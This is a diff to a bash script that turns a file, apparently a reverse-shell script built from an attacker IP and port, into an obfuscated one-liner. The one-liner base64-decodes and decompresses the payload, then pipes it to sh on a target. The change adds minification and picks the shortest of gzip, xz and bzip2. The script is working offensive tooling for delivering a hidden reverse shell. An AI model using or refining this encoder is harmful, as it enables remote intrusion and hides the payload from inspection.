@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
-# Usage: encode <file> [H=<ip> P=<port>]
+# Usage: encode <file> [H=<ip>] [P=<port>]
 # If H and P are given, regenerates <file> via the revshell script first.
-# Outputs a one-liner that decodes and executes the script on the target.
+# Minifies (strips indentation + blank lines) then tries every available
+# compressor (gzip, xz, bzip2) and emits the shortest one-liner.
 
 FILE="${1:?usage: encode <file> [H=ip] [P=port]}"; shift
 H="" P=""
@@ -19,4 +20,25 @@ fi
 
 [[ -f "$FILE" ]] || { echo "error: $FILE not found" >&2; exit 1; }
 
-printf 'echo %s|base64 -d|gunzip|sh\n' "$(gzip -9c "$FILE" | base64 | tr -d '\n')"
+minified=$(sed 's/^[[:space:]]*//' "$FILE" | grep -v '^[[:space:]]*$')
+
+best_len=999999
+best_line=""
+
+try() {
+  local cmd="$1" dec="$2"
+  command -v "$cmd" &>/dev/null || return
+  local payload line
+  payload=$(printf '%s\n' "$minified" | "$cmd" -9c | base64 | tr -d '\n')
+  line="echo ${payload}|base64 -d|${dec}|sh"
+  if [[ ${#line} -lt $best_len ]]; then
+    best_len=${#line}
+    best_line="$line"
+  fi
+}
+
+try gzip  gunzip
+try xz    "xz -d"
+try bzip2 bunzip2
+
+printf '%s\n' "$best_line"
